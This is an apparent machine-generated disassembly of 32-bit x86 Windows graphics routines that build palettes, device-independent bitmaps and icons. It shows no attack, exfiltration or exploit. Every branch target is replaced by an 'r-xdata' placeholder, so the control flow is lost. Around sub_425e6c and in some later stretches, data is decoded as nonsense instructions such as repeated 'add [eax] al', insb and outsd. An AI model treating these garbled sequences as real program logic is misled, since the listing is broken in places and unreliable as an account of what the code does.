movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_424e54
mov eax esp
call sub_424fc0
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4250fc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_424e54
mov [ esp ] eax
sub_425150
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424af0
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xe ]
call sub_424ad0
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4252fd
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
add edx edx
add edx edx
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424960
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425223
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_424970
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42522a
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_424864
sub_42522a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424af0
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424960
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4252dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_424970
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4252e4
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_42531c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
movzx ecx [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
movzx ebx [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4253ac
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_402d10
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4256a5
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_425495
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_424864
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42549c
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42549c
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_425310
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_402d10
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_425685
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_425150
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_402d10
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_425662
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
movzx eax [ ebp - 0x46 ]
push eax
movzx eax [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425669
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402d44
retn
call sub_4248b8
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_425310
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_42531c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4256d0
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_424840
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_403728
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424af0
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
movzx eax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_4257b4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4256d0
movzx eax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425824
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4256d0
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4258c1
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258c8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_4258fc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_403728
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_403728
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_4258f0
xor edx edx
push ebp
push sub_425aec
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4257b4
push 0xffffffff
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4257b4
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_425ac5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_402d10
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_402d10
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_402d10
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_402d10
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425824
mov eax [ ebp - 0x24 ]
push eax
push 0xffffffff
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425824
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
movzx edx [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
movzx edx [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
movzx edx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425acc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402d44
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402d44
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402d44
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402d44
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_425acc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425af3
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_425afc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_425b4c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_425ba4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_425b4c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425bf0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403e3c
mov edi eax
mov eax esi
call sub_403e3c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_425d27
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425d0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4091b0
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d11
mov eax [ ebp - 0xc ]
call sub_403f64
retn
mov al 0x1
sub_425d48
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_419774
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425d90
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d97
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
sub_425d9c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
movzx ebx [ ebp + 0x14 ]
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_425dd4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_419774
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425e1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e26
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
sub_425e30
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
pop esi
pop ebx
retn
sub_425e6c
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
xor al 0x6a
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
inc ecx
add [ esi + 0x671c0041 ] bl
inc ecx
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x4004010 ] dh
add [ eax ] al
add [ eax + 0x8004010 ] dh
add [ eax ] al
add [ ebp + 0x5ee00040 ] cl
mov edx r-xdata
mov eax esi
call sub_426084
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_425fe1
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403f34
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_426084
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_404288
insb
inc esi
outsd
jb r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
pop esi
inc edx
add [ eax ] dl
add [ eax ] al
add al dh
inc eax
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] bh
pushad
inc edx
add al dh
inc ecx
add [ edx + ebp * 2 ] dh
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_426084
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_426084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fe8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
mov al 0x4a
add al ch
adc dh bh
dec [ ebx + 0x1cbaf84d ]
pushad
inc edx
add [ ebx + 0x106e8c6 ] cl
add [ eax ] al
je r-xdata
popad
sub_425f04
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_425fe1
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403f34
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_426084
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_426084
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_426084
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_426084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fe8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
add esp 0xfffffff0
call sub_404288
sub_426084
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_426107
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_405f18
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40933c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_404e98
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_404e98
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_416668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42610e
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_426118
